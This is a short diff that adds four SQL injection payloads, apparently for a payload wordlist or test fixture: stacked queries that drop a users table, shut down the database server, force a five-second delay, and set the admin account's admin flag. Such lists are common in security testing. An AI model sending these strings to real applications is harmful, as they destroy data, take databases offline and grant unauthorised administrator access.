@@ -1,0 +1,4 @@
+'; DROP TABLE users --
+'; SHUTDOWN --
+'; SELECT SLEEP(5) --
+'; UPDATE users SET admin='1' WHERE username='admin' --
